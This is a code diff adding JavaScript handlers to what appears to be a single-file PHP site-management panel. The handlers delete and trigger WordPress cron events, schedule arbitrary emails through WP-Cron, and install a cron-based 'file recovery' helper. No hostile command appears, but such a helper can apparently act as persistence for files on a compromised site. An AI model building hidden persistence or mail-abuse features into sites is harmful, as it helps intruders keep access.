+  p.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{if(!confirm('Delete this WordPress cron event?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);const r=await wpAutoPost('?x=wp_cron_delete',fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();}));
+  document.getElementById('wpRunCron')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_cron_run',fd);toast(r.ok?'WP-Cron triggered.':(r.error||'Cron failed.'));});
+  document.getElementById('wpScheduleMail')?.addEventListener('click',async()=>{const dt=document.getElementById('wpMailTime').value;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('mail_to',document.getElementById('wpMailTo').value);fd.append('mail_subject',document.getElementById('wpMailSubject').value);fd.append('mail_body',document.getElementById('wpMailBody').value);fd.append('mail_time',dt?Math.floor(new Date(dt).getTime()/1000):0);const r=await wpAutoPost('?x=wp_cron_email',fd);toast(r.ok?'Email scheduled through WP-Cron.':(r.error||'Scheduling failed.'));if(r.ok)wpAutoLoad();});
+   if(tab==='recovery'){wpAutoPost('?x=wp_recovery_status',new FormData()).then(r=>{const s=document.getElementById('wpRecoveryState');if(s)s.innerHTML=r.error?esc(r.error):(r.installed?`Installed. Next event: ${(r.events||[]).map(e=>esc(e.date)).join(', ')||'pending'}`:'Not installed.');}).catch(()=>{const s=document.getElementById('wpRecoveryState');if(s)s.textContent='Status check failed.';});document.getElementById('wpRecoveryInstall')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_install',fd);toast(r.ok?'WP-Cron file recovery installed.':(r.error||'Install failed.'));if(r.ok)wpAutoPanel('recovery');});document.getElementById('wpRecoveryRemove')?.addEventListener('click',async()=>{if(!confirm('Remove the visible WP-Cron file recovery helper?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_remove',fd);toast(r.ok?'WP-Cron file recovery removed.':(r.error||'Remove failed.'));if(r.ok)wpAutoPanel('recovery');});}
 }
 document.getElementById('wpAutomationBtn')?.addEventListener('click',()=>{openMod('wpAutomationOv');wpAutoLoad(true);});
 document.getElementById('wpAutomationClose')?.addEventListener('click',()=>closeMod('wpAutomationOv'));
